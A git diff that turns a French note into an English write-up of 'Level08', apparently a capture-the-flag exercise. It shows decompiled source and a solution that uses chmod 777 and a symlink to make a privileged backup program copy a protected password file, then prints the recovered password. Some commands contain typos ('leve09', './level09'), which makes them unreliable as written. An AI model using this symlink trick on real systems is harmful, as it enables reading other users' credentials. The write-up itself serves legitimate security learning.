@@ -1,12 +1,42 @@
-le programme ouvre argv[1] et l'ecrit dans ./backups/argv[1]
+# Level08
 
-si on veut ouvrir /home/users/level09/.pass le programme
-	essaye d'ouvrir ./backups//home/users/level09/.pass
+## Setup
 
-le // pose probleme
-il suffit simplement de creer un lien symbolique de /home/users/level09/.pass dans notre home ->
-	> chmod 777 . (pour avoir les droits d'ecriture dans notre HOME)
-	> ln -sf /home/users/leve09/.pass pass
-	> ./level09 pass
-	> cat ./backups/pass
-<<< fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+We find a binary file at the root of the user **`level08`** named *`./level08`*.
+
+```bash
+scp -r -P 4242 level08@<vm_ip>:/home/users/level08/level08 .
+```
+
+### Hex-Rays
+
+We used the Hex-Rays output on the [Dogbolt website](https://dogbolt.org/).
+
+## Source
+	FILE *stream;
+	...
+	stream = fopen(argv[1], "r");
+	...
+	strcpy(dest, "./backups/");
+	strncat(dest, argv[1], 99 - strlen(dest));
+	...
+	fd = open(dest, 193, 432LL);
+	...
+	while ( 1 ) {
+		buf = fgetc(stream);
+		...
+		write(fd, &buf, 1uLL);
+	}
+	...
+
+The program opens argv[1] and then writes its content in `./backups/{argv[1]}` \
+If we want to open `/home/users/level09/.pass` the program tries to write it to `./backups//home/users/level09/.pass`
+
+## Solution
+
+The `//` is an issue, to circumvent it, we can create a symbolic link of `/home/users/level09/.pass` in our Home -> \
+	> chmod 777 . (pour avoir les droits d'ecriture dans notre HOME) \
+	> ln -sf /home/users/leve09/.pass pass \
+	> ./level09 pass \
+	> cat ./backups/pass \
+	fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
